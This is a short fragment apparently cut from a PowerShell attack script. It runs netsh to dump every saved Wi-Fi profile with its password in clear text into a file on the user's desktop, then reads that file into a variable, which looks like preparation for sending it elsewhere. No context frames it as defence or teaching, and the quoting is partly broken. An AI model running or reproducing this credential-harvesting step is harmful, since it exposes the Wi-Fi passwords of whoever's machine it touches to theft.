netsh wlan show profiles | % {netsh wlan show profile name='$_' key=clear} > $env:USERPROFILE\\Desktop\\wifipass.txt;"
    ...
    "$f=Get-Content $env:USERPROFILE\\Desktop\\wifipass.txt -Raw;"
